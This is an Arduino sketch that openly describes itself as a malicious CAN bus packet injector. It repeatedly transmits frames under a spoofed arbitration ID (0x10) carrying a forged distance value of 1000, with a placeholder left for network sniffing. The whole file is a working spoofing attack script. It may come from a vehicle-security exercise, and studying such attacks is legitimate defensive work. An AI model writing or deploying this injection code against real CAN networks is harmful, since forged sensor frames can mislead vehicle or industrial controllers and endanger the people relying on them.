/*****************************************
 * Author:
 * 
 * Malicious packet creation, to be injected into a CAN Bus 
*****************************************/

#include <CAN.h>
// CONSTANTS
const int RETRY_DELAY_MS = 2000;
const int LOOP_DELAY_MS = 1000;
const long CAN_SPEED = 500E3;


// GLOBAL VARIABLES
bool g_canActive = false;
long g_canID   = 0x10; // spoofed ID
long g_distance = 1000;

// SETTING UP THE NODE TO TRANSMIT THROUGH CAN bus
void setup() {
    Serial.begin(9600);

    // Initialize CAN bus
    initCAN();
}

void loop() {
    // Initialize CAN bus if not already active
    if (!g_canActive){
        initCAN();
    }

    // Inject malicious code
    sendDistanceOverCAN(g_distance);

    // Delay until next loop iteration
    delay(LOOP_DELAY_MS);
}

// INITIALIZE CAN FOR initCAN()
void initCAN(){
    if (!CAN.begin(CAN_SPEED)){
        g_canActive = false;
    } else {
        g_canActive = true;
    }
}

// SNIFFING THE NETWORK AND OUTPUTTING
// TO DO IF NEEDED

// MALICIOUS PACKET GENERATION
// Change payload
void maliciousPayloadGenerator(){
    g_distance = 1000;
}

// MALICIOUS PACKET SENDING
void sendDistanceOverCAN(uint16_t distance){
    byte canData[2] = {0};
    bool rtr        = false;
    int dlc         = sizeof (canData);

    canData[0] = distance & 0xFF;       // LSB of distance
    canData[1] = (distance >> 8) & 0xFF;// MSB of distance

    if (!CAN.beginPacket(g_canID, dlc, rtr)){
        g_canActive = false;
    } else if (!CAN.write(canData, 2)){
        g_canActive = false;
    } else if(!CAN.endPacket()){
        g_canActive = false;
    } else {
        Serial.println("CAN packet sent successfully");
    }
}
